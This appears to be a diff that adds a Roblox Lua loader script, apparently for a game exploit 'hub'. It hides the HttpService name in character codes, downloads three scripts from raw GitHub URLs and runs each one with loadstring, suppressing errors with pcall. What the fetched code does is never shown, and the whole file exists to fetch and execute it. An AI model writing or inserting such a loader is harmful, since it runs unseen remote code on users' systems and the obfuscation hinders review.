@@ -1,0 +1,15 @@
+loadstring([[
+    local g=game
+    local h=g.HttpGet
+    local u=g:GetService(string.char(72,116,116,112,83,101,114,118,105,99,101))
+    local urls={
+        "https://raw.githubusercontent.com/hexascripts01/hexa_hub_sty/refs/heads/main/%3F_free_hexa_hub_sty_v2_%3F",
+        "https://raw.githubusercontent.com/hexascripts01/hexa_hub_sty/refs/heads/main/%3F_fall_%3F",
+        "https://raw.githubusercontent.com/hexascripts01/hexa_hub_sty/refs/heads/main/%3F_ply_view_%3F"
+    }
+    for _,v in ipairs(urls) do
+        pcall(function()
+            loadstring(h(u,v))()
+        end)
+    end
+]])()
